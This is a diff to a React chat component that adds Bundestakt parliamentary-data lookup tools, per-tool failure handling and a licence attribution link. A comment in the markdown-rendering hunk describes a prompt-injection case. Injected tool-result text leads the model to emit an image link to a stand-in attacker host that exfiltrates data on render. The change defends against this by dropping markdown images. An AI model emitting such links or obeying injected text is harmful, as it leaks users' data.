@@ -22,7 +22,18 @@ import { useX402Chat, DEFAULT_LLM_AGENT_URL } from "../hooks/useX402Chat";
 import { useX402ImageGeneration } from "../hooks/useX402ImageGeneration";
 import { fetchAgentCard, precheckLlmV1Agent, type AgentCard } from "../hooks/x402Discovery";
 import { generateImageTool } from "../tools/generateImage";
+import {
+  getSitzungenTool,
+  searchClaimsTool,
+  fetchSitzungen,
+  fetchClaims,
+  selectSitzungen,
+  selectClaims,
+  fetchFailed,
+  type BundestaktResult,
+} from "../tools/bundestakt";
 import type { X402ChatMessage, X402ToolCall } from "../types/x402";
+import { useQueryClient } from "@tanstack/react-query";
 import { getViemChain, toCAIP2, fromCAIP2, getGenAiNFTMainnetNetworks } from "@fretchen/chain-utils";
 import { useChainId } from "wagmi";
 import { ChainBadge, getChainName } from "./ChainBadge";
@@ -32,7 +43,17 @@ import { PageHeader } from "./PageHeader";
 // Hops in one sendMessage() call before giving up and showing the fallback message — the
 // circuit breaker on a model that keeps requesting tools instead of answering. Each hop is a
 // separately metered chat message, so this also bounds worst-case cost per user turn.
-const MAX_HOPS = 3;
+//
+// 4 rather than 3: the Bundestakt flow is list -> detail -> answer, which already fills three,
+// so a combined question (find the session, read it, then check a claim) needs one more.
+const MAX_HOPS = 4;
+
+// Everything offered to the model. Hoisted for a stable identity across renders; the loop
+// filters this down as tools fail, which is why the array itself stays constant.
+const TOOLS = [generateImageTool, getSitzungenTool, searchClaimsTool];
+
+// Read-only lookups that carry a CC BY attribution obligation when they actually contribute.
+const BUNDESTAKT_TOOL_NAMES = new Set([getSitzungenTool.function.name, searchClaimsTool.function.name]);
 
 // Hoisted so the array identity is stable across renders. Mainnet-only on purpose — see the
 // useAutoNetwork call in the component for why a testnet entry here would be a real hazard.
@@ -67,6 +88,16 @@ function describeToolFailure(err: unknown): string {
   return singleLine.length > 200 ? `${singleLine.slice(0, 200)}…` : singleLine;
 }
 
+/** Tool arguments arrive as a JSON *string*. Malformed ones become `{}` rather than an error:
+ *  the selectors treat every field as optional, so an argument-less call still returns data. */
+function parseToolArgs(call: X402ToolCall): Record<string, unknown> {
+  try {
+    return JSON.parse(call.function.arguments) as Record<string, unknown>;
+  } catch {
+    return {};
+  }
+}
+
 // The custom-URL escape hatch (AgentSelector) lets the chat pay any llm/v1 agent. It is also
 // the only ready-made batch-settlement client there is, so it doubles as the end-to-end test
 // for anyone following the build guide at /agent-onboarding. A curated picker (rather than a
@@ -79,6 +110,10 @@ interface ChatMessage {
   /** Set when this turn's answer came after a generate_image tool call. Display only — never
    *  sent back to the model; the model's own closing text is its memory of having made it. */
   imageUrl?: string;
+  /** Set when a Bundestakt lookup actually fed this answer. Display only, like imageUrl.
+   *  CC BY 4.0 requires naming and linking the source, so this is a licence obligation — and
+   *  it is set only on a successful lookup, since a failed one contributed nothing to cite. */
+  bundestaktUsed?: boolean;
 }
 
 /** The confirm card's lifecycle. No "failed" phase: a cancel or error clears the card
@@ -150,6 +185,7 @@ export function AssistantChat() {
   const systemPromptMessage = useLocale({ label: "assistent.systemPrompt" });
   const noResponseMessage = useLocale({ label: "assistent.noResponse" });
   const imageReadyMessage = useLocale({ label: "assistent.imageReady" });
+  const bundestaktSourceLabel = useLocale({ label: "assistent.bundestaktSource" });
   const errorPrefixMessage = useLocale({ label: "assistent.errorPrefix" });
   const connectWalletMessageLabel = useLocale({ label: "assistent.connectWalletMessage" });
   const loadingLabel = useLocale({ label: "assistent.loading" });
@@ -223,6 +259,8 @@ export function AssistantChat() {
     switchError: switchImageError,
   } = useAutoNetwork(IMAGE_TOOL_NETWORKS);
   const { generateImage } = useX402ImageGeneration();
+  // Bundestakt's caching lives here rather than in tools/bundestakt.ts — see loadBundestakt().
+  const queryClient = useQueryClient();
 
   // The confirm card is transient UI state, never a chat message — it cannot be scrolled back
   // to or replayed. `confirmResolverRef` is how a linear async loop (sendMessage) pauses for a
@@ -303,12 +341,12 @@ export function AssistantChat() {
   }
 
   /**
-   * Runs one tool call end to end: pause for the user's confirmation, generate the image on
+   * Runs the image tool end to end: pause for the user's confirmation, generate the image on
    * its own network/scheme, and return the compact `{status}` result the model gets back plus
    * the image URL for local rendering. Never throws — every failure path resolves to a status
    * the model can react to.
    */
-  async function runToolCall(
+  async function runImageTool(
     call: X402ToolCall,
   ): Promise<{ result: { status: string; network?: string; reason?: string }; imageUrl?: string }> {
     let args: { prompt?: string; size?: string } = {};
@@ -358,6 +396,51 @@ export function AssistantChat() {
     }
   }
 
+  /**
+   * Fetches one Bundestakt endpoint and projects it. `tools/bundestakt.ts` is deliberately
+   * stateless, so the caching policy lives here: both endpoints are whole-dump GETs (71 KB and
+   * 912 KB), and the intended flow calls `/sitzungen` twice in one turn — once to list, once
+   * for the chosen slug — so a per-turn cache is the difference between one download and two.
+   */
+  async function loadBundestakt(
+    kind: "sitzungen" | "claims",
+    args: Record<string, unknown>,
+  ): Promise<BundestaktResult> {
+    try {
+      const raw = await queryClient.fetchQuery({
+        queryKey: ["bundestakt", kind],
+        queryFn: kind === "sitzungen" ? fetchSitzungen : fetchClaims,
+        staleTime: 5 * 60_000,
+        retry: 0,
+      });
+      return kind === "sitzungen" ? selectSitzungen(raw, args) : selectClaims(raw, args);
+    } catch (err) {
+      // fetchQuery rethrows the fetcher's error; the module owns the wire-level failure shape.
+      return fetchFailed(err);
+    }
+  }
+
+  /**
+   * Dispatches one tool call by name. Only `generate_image` is confirmation-gated and costs
+   * money; the Bundestakt lookups are free and read-only, so they run silently.
+   */
+  async function runToolCall(
+    call: X402ToolCall,
+  ): Promise<{ result: { status: string; [key: string]: unknown }; imageUrl?: string }> {
+    switch (call.function.name) {
+      case generateImageTool.function.name:
+        return runImageTool(call);
+      case getSitzungenTool.function.name:
+        return { result: await loadBundestakt("sitzungen", parseToolArgs(call)) };
+      case searchClaimsTool.function.name:
+        return { result: await loadBundestakt("claims", parseToolArgs(call)) };
+      default:
+        // A model that invents a tool name gets told so and can correct itself, rather than
+        // the whole message failing.
+        return { result: { status: "unknown_tool" } };
+    }
+  }
+
   const sendMessage = async (userMessage: string) => {
     if (!userMessage.trim() || isLoading) return;
 
@@ -391,8 +474,10 @@ export function AssistantChat() {
 
       let finalContent: string | null = null;
       let finalImageUrl: string | undefined;
-      // Once a tool call has failed, later hops stop offering the tool — see the tool_choice below.
-      let toolFailed = false;
+      let usedBundestakt = false;
+      // Per tool, not global: a failed Bundestakt lookup must not also disable generate_image
+      // for the rest of the turn. A failed tool is simply no longer offered on later hops.
+      const failedTools = new Set<string>();
 
       for (let hop = 0; hop < MAX_HOPS; hop++) {
         // Cheap no-op once the wallet is already on the right chain — re-checked every hop
@@ -403,13 +488,18 @@ export function AssistantChat() {
         }
 
         // After a failed tool call the model is told what went wrong and given one turn to say so
-        // — but NOT another chance to call the same failing tool. Left on "auto" it just retries:
+        // — but NOT another chance to call the same failing tool. Left on offer it just retries:
         // a real conversation burned all three hops re-requesting an image that kept failing, so
         // the user approved three wallet prompts, paid for three attempts, and got the generic
         // "no response" fallback because no hop ever produced text.
+        const offered = TOOLS.filter((t) => !failedTools.has(t.function.name));
         const data = await payAndSend(convo, {
-          tools: [generateImageTool],
-          tool_choice: toolFailed ? "none" : "auto",
+          // `[]` is truthy, and useX402Chat spreads `tools` in on truthiness — an empty array
+          // would be sent as `tools: []`. `undefined` drops the key (and tool_choice with it),
+          // which is what "nothing left to offer" means on the wire. tool_choice is otherwise
+          // left to the hook's own "auto" default: withholding a tool now expresses what
+          // tool_choice: "none" used to, and more precisely.
+          tools: offered.length > 0 ? offered : undefined,
         });
         const choice = data.choices?.[0];
         const toolCalls = choice?.message.tool_calls;
@@ -428,7 +518,11 @@ export function AssistantChat() {
         for (const call of toolCalls) {
           const { result, imageUrl } = await runToolCall(call);
           if (imageUrl) finalImageUrl = imageUrl;
-          if (result.status !== "ok") toolFailed = true;
+          // `not_found` (an unrecognized slug) is a normal, recoverable outcome — the whole point
+          // of the list-then-detail pattern in the system prompt is that the model can retry with
+          // a corrected slug. Only a real failure withdraws the tool for the rest of the turn.
+          if (result.status !== "ok" && result.status !== "not_found") failedTools.add(call.function.name);
+          else if (BUNDESTAKT_TOOL_NAMES.has(call.function.name)) usedBundestakt = true;
           convo.push({ role: "tool", tool_call_id: call.id, content: JSON.stringify(result) });
         }
       }
@@ -440,6 +534,7 @@ export function AssistantChat() {
         content: finalContent ?? (finalImageUrl ? imageReadyMessage : noResponseMessage),
         timestamp: Date.now(),
         imageUrl: finalImageUrl,
+        bundestaktUsed: usedBundestakt,
       };
       setMessages((prev) => [...prev, assistantMsg]);
     } catch (error) {
@@ -597,7 +692,16 @@ export function AssistantChat() {
                       }`}
                     >
                       {message.role === "assistant" ? (
-                        <ReactMarkdown remarkPlugins={[remarkGfm]}>{message.content}</ReactMarkdown>
+                        /* Markdown images are dropped, links are not. An image loads itself the
+                           moment it renders, so a model talked into emitting
+                           `![](https://attacker/?q=…)` — by injected text in a tool result, which
+                           the Bundestakt lookups pull from a third-party API without any
+                           confirmation step — would exfiltrate on sight. A link needs a click.
+                           This does NOT affect the generated image below: that renders through
+                           its own <img>, not through markdown. */
+                        <ReactMarkdown remarkPlugins={[remarkGfm]} components={{ img: () => null }}>
+                          {message.content}
+                        </ReactMarkdown>
                       ) : (
                         <div className={chat.messageContentPlain}>{message.content}</div>
                       )}
@@ -607,6 +711,13 @@ export function AssistantChat() {
                           alt=""
                           className={css({ maxWidth: "100%", borderRadius: "md", marginTop: "2" })}
                         />
+                      )}
+                      {message.bundestaktUsed && (
+                        <div className={chat.messageSource}>
+                          <a href="https://www.bundestakt.de" target="_blank" rel="noopener noreferrer">
+                            {bundestaktSourceLabel}
+                          </a>
+                        </div>
                       )}
                     </div>
                   </div>
